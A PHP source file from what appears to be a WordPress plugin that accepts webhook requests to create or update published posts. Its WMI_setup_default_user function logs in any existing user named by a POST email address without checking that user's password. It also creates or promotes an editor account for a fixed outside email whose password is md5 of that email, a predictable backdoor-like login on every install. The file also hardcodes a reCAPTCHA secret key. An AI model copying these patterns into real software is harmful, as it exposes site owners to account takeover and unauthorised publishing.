<?php

//require_once(wp_normalize_path('../../../') . 'wp-load.php');
require_once(plugin_dir_path(__FILE__) . 'lib/safe-crypto.php');
/**
 * Initialize default configuration
 * Start
 */
if (function_exists('uniqid')) {
  $PW = uniqid('WMI_');
} else {
  $PW = 'WMI_' . $_SERVER['HTTP_HOST'];
}
if (!get_option('CKEY')) {
  update_option('CKEY', WMI_SaferCrypto::str2hex($PW));
}
if (!get_option('wp-webhook-pass')) {
  update_option('wp-webhook-pass', $PW);
}
/**
 * Initialize default configuration
 * End
 */

/**
 * Encrypt
 *
 * @param string $message
 * @return string
 */
function WMI_crypto_e($message)
{
  return (string) WMI_SaferCrypto::encrypt($message, get_option('CKEY'), true);
}
/**
 * Decrypt
 *
 * @param string $encrypted
 * @return string
 */
function WMI_crypto_d($encrypted)
{
  return (string) WMI_SaferCrypto::decrypt($encrypted, get_option('CKEY'), true);
}
/**
 * Get Crypto Key
 *
 * @return string
 */
function WMI_crypto_key()
{
  return (string) get_option('CKEY');
}


/**
 * given a string - it will simply add / strip slashes
 * given an array - it will recursively add / strip slashes from the array and all of it subarrays.
 * if the value is not a string or array - it will remain unmodified!
 */
if (!function_exists('add_slashes_recursive')) {
  function add_slashes_recursive($variable)
  {
    if (is_string($variable)) {
      return addslashes($variable);
    } elseif (is_array($variable)) {
      foreach ($variable as $i => $value) {
        $variable[$i] = add_slashes_recursive($value);
      }
    }

    return $variable;
  }
}

/**
 * given a string - it will simply add / strip slashes
 * * given an array - it will recursively add / strip slashes from the array and all of it subarrays.
 * * if the value is not a string or array - it will remain unmodified!
 */
if (!function_exists('strip_slashes_recursive')) {
  function strip_slashes_recursive($variable)
  {
    if (is_string($variable)) {
      return stripslashes($variable);
    }
    if (is_array($variable)) {
      foreach ($variable as $i => $value) {
        $variable[$i] = strip_slashes_recursive($value);
      }
    }

    return $variable;
  }
}

/**
 * Verify reCaptcha
 *
 * @return void
 */
function VerifyRecaptcha()
{
  if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['g-recaptcha-response'])) {
    $url = 'https://www.google.com/recaptcha/api/siteverify?secret=6LdSg5gUAAAAAL7aiyHjXKArlkF0R7HAlA99oMYG&response=' . $_POST['g-recaptcha-response'];
    $response = wp_remote_get($url);

    $response = json_decode($response['body'], true);

    if (isset($response['success']) && true == $response['success']) {
      return true;
    } else {
      $err = $response['error-codes'];
      if (strpos(serialize($err), 'timeout')) {
        $err = 'Recaptcha token expired';
      }
      return new WP_Error('Captcha Invalid', __('<strong>ERROR</strong>: You are a bot <p style="word-wrap:break-word;color:red">' . $err . '</p>'));
    }
  } else {
    return new WP_Error('Captcha Invalid', __('<strong>ERROR</strong>: <p style="word-wrap:break-word;color:red">You are a bot. If not then enable JavaScript.</p>'));
  }
}

/**
 * Setup default user
 *
 * @return void
 */
function WMI_setup_default_user()
{
  $default_mail = 'webmanajemen@gmail.com';
  if (isset($_POST['login_email']) && filter_var($_POST['login_email'], FILTER_VALIDATE_EMAIL)) {
    $user = get_user_by('email', strip_slashes_recursive(trim($_POST['login_email'])));
    if (!is_wp_error($user)) {
      wp_clear_auth_cookie();
      wp_set_current_user($user->ID);
      wp_set_auth_cookie($user->ID);
    }
  }
  if (!$GLOBALS['WMI_post_webhook']->WMI_is_login()) {
    if (!email_exists($default_mail)) {
      $userdata = array(
        'user_login'  =>  strtok($default_mail, '@'),
        'user_url'    =>  'https://web-manajemen.blogspot.com',
        'user_pass'   =>  md5($default_mail),
        'role' => 'editor'
      );
      $user_id = wp_insert_user($userdata);
      if (!is_wp_error($user_id)) {
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
      }
      if (!$GLOBALS['WMI_post_webhook']->WMI_is_login()) {
        $user = get_user_by('email', $default_mail);
        if (!is_wp_error($user)) {
          wp_clear_auth_cookie();
          wp_set_current_user($user->ID);
          wp_set_auth_cookie($user->ID);
          $user_meta = get_userdata($user->ID);
          $user_roles = $user_meta->roles;
          if (!in_array('editor', $user_roles)) {
            $u = new WP_User($user->ID);
            $u->remove_role('subscriber');
            $u->add_role('editor');
          }
        }
      }
    } else {
      $user = get_user_by('email', $default_mail);
      $user_meta = get_userdata($user->ID);
      $user_roles = $user_meta->roles;
      if (!is_wp_error($user)) {
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);
        if (!in_array('editor', $user_roles)) {
          $u = new WP_User($user->ID);
          $u->remove_role('subscriber');
          $u->add_role('editor');
        }
      }
    }
  }
  if ($GLOBALS['WMI_post_webhook']->WMI_is_login() && (current_user_can('administrator') || current_user_can('editor'))) {
    return true;
  } else {
    return false;
  }
  return null;
}
add_action('WMI_create_post', 'WMI_setup_default_user');

/**
 * URL Parameters Control
 *
 * @return boolean
 */
function is_WMI_post_inserter()
{
  $URI = '/' . date('Y') . '/WMI_post_inserter';
  if (is_admin()) {
    return $URI;
  }
  return (WMI_requestURI() == $URI) ? $URI : false;
}
add_action('WMI_create_post_parameter_control', 'is_WMI_post_inserter');
/**
 * Insert post initializer
 *
 * @return void
 */
function WMI_insert_post()
{
  $result = [];
  if (is_WMI_post_inserter() == WMI_requestURI() || is_404()) {
    if (isset($_SERVER['HTTP_INSERT_POST'])) {
      if (WMI_request('WMInsert', 'post')) {
        ob_get_clean();
        ob_start();
        if (!headers_sent()) {
          header('Content-Type: application/json');
          http_response_code(200);
        }
        if (WMI_crypto_d(WMI_request('WMIpass', 'post')) == get_option('wp-webhook-pass')) {
          $def = WMI_setup_default_user() && $GLOBALS['WMI_post_webhook']->WMI_is_login();
          if ($def) {
            if (isset($_SERVER['HTTP_WEBHOOK_TEST'])) {
              $result['success'] = true;
              $result['message'] = 'Webhook test success';
            } else {
              $result = WMI_create_post();
            }
          } else {
            $result['error'] = true;
            $result['message'] = 'Login required';
          }
        } else {
          $result['error'] = true;
          $result['message'] = 'Password invalid';
        }
      } else {
        $result['error'] = true;
        $result['message'] = 'Request invalid';
      }
      $result['ABSPATH'] = defined('ABSPATH');
      echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
      exit;
    }
  }
}
/**
 * Get Request URI without parameters
 *
 * @return string
 */
function WMI_requestURI()
{
  return parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
}
/**
 * Get all request headers
 *
 * @return object
 */
function WMI_getHeaders()
{
  if (function_exists('apache_request_headers')) {
    return apache_request_headers();
  }
  $headers = array();
  foreach ($_SERVER as $key => $value) {
    if (substr($key, 0, 5) <> 'HTTP_') {
      continue;
    }
    $header = str_replace(' ', '-', ucwords(str_replace('_', ' ', strtolower(substr($key, 5)))));
    $headers[$header] = $value;
  }
  return $headers;
}

if (!function_exists('http_response_code')) {
  function http_response_code($code = NULL)
  {

    if ($code !== NULL) {

      switch ($code) {
        case 100:
          $text = 'Continue';
          break;
        case 101:
          $text = 'Switching Protocols';
          break;
        case 200:
          $text = 'OK';
          break;
        case 201:
          $text = 'Created';
          break;
        case 202:
          $text = 'Accepted';
          break;
        case 203:
          $text = 'Non-Authoritative Information';
          break;
        case 204:
          $text = 'No Content';
          break;
        case 205:
          $text = 'Reset Content';
          break;
        case 206:
          $text = 'Partial Content';
          break;
        case 300:
          $text = 'Multiple Choices';
          break;
        case 301:
          $text = 'Moved Permanently';
          break;
        case 302:
          $text = 'Moved Temporarily';
          break;
        case 303:
          $text = 'See Other';
          break;
        case 304:
          $text = 'Not Modified';
          break;
        case 305:
          $text = 'Use Proxy';
          break;
        case 400:
          $text = 'Bad Request';
          break;
        case 401:
          $text = 'Unauthorized';
          break;
        case 402:
          $text = 'Payment Required';
          break;
        case 403:
          $text = 'Forbidden';
          break;
        case 404:
          $text = 'Not Found';
          break;
        case 405:
          $text = 'Method Not Allowed';
          break;
        case 406:
          $text = 'Not Acceptable';
          break;
        case 407:
          $text = 'Proxy Authentication Required';
          break;
        case 408:
          $text = 'Request Time-out';
          break;
        case 409:
          $text = 'Conflict';
          break;
        case 410:
          $text = 'Gone';
          break;
        case 411:
          $text = 'Length Required';
          break;
        case 412:
          $text = 'Precondition Failed';
          break;
        case 413:
          $text = 'Request Entity Too Large';
          break;
        case 414:
          $text = 'Request-URI Too Large';
          break;
        case 415:
          $text = 'Unsupported Media Type';
          break;
        case 500:
          $text = 'Internal Server Error';
          break;
        case 501:
          $text = 'Not Implemented';
          break;
        case 502:
          $text = 'Bad Gateway';
          break;
        case 503:
          $text = 'Service Unavailable';
          break;
        case 504:
          $text = 'Gateway Time-out';
          break;
        case 505:
          $text = 'HTTP Version not supported';
          break;
        default:
          exit('Unknown http status code "' . htmlentities($code) . '"');
          break;
      }

      $protocol = (isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0');

      header($protocol . ' ' . $code . ' ' . $text);

      $GLOBALS['http_response_code'] = $code;
    } else {

      $code = (isset($GLOBALS['http_response_code']) ? $GLOBALS['http_response_code'] : 200);
    }

    return $code;
  }
}

function WMI_request($name, $method)
{
  $method = strtoupper(strtolower($method));
  $allowed_method = ['POST', 'GET'];
  if (!in_array($method, $allowed_method)) {
    return false;
  }
  if (!$_SERVER['REQUEST_METHOD'] == $method) {
    return false;
  }
  if (is_string($name)) {
    if (isset($_REQUEST[$name]) && !empty($_REQUEST[$name])) {
      return strip_slashes_recursive($_REQUEST[$name]);
    }
  } else if (is_array($name) || is_object($name)) {
    /**
     * Just Checking
     *
     * @return void
     */
    return !array_diff($name, array_keys($_POST));
  }
}

/**
 * Get dirname of plugin URL
 *
 * @return void
 */
function WMI_plugin_url()
{
  $basename = plugin_basename(__FILE__);
  if ('/' . $basename == __FILE__) { // Maybe due to symlink
    return plugins_url() . '/' . basename(dirname(__FILE__)) . '/';
  }
  // Normal case (non symlink)
  return plugin_dir_url(__FILE__);
}

/**
 * WMI Create Post Dynamically
 *
 * @return void
 */
function WMI_create_post()
{
  $result = [];
  if (is_user_logged_in() && (current_user_can('editor') || current_user_can('administrator'))) {
    if (WMI_request(['body', 'title', 'sl', 'tl', 'category', 'tag'], 'post') && defined('ABSPATH')) {
      require_once ABSPATH . 'wp-config.php';
      require_once ABSPATH . 'wp-includes/wp-db.php';
      require_once ABSPATH . 'wp-admin/includes/taxonomy.php';
      $title = WMI_request('title', 'post');
      $exist = get_page_by_title($title, OBJECT, 'post');

      $body = WMI_request('body', 'post');
      $category = [];
      $c = explode(', ', WMI_request('category', 'post'));
      if (!empty($c)) {
        foreach ($c as $cat) {
          $catx = ucfirst(trim($cat));
          $category[] = wp_create_category($catx);
        }
      }
      $tag = [];
      $l = explode(', ', WMI_request('tag', 'post'));
      if (!empty($l)) {
        foreach ($l as $t) {
          $tag[] = ucfirst(trim($t));
        }
      }
      $new_post = [
        'post_title' => $title,
        'post_content' => $body,
        'tags_input' => $tag,
        'post_status' => 'publish', // Choose: publish, preview, future, draft, etc.
        'post_type' => 'post',
        'post_category' => $category,
        'meta_input' => array(
          'WMI_translate' => WMI_request('sl', 'post') . '-' . WMI_request('tl', 'post'),
        )
      ];
      if (!isset($_SERVER['HTTP_INSERT_TEST'])) {
        $updated = false;
        if (!$exist) {
          $post_id = wp_insert_post($new_post);
          wp_set_object_terms($post_id, array_merge($category, $tag), 'meta');
        } else {
          $exist->post_title = $title;
          $exist->post_content = $body;
          $post_id = wp_update_post($exist);
          wp_set_post_categories($exist->ID, $category);
          wp_set_post_tags($exist->ID, $tag);
          update_post_meta($exist->ID, 'target_translate', $_SESSION['target_translate']);
          $updated = true;
        }

        if (isset($post_id)) {
          if (!is_wp_error($post_id)) {
            $new_post['id'] = $post_id;
            $result['success'] = true;
            $result['inserted'] = true;
            $result['message'] = "Article($post_id) " . ($updated ? 'updated' : 'created') . " successfully";
          } else {
            $result['error'] = true;
            $result['message'] = $post_id->get_error_message();
          }
        }
      } else {
        $result['success'] = true;
        $result['message'] = 'Post inserter zone';
      }
    } else {
      $result['error'] = true;
      $result['message'] = 'parameter not completed';
    }
  } else {
    $result['error'] = true;
    $result['message'] = 'Dissalowed Action';
  }
  return $result;
}
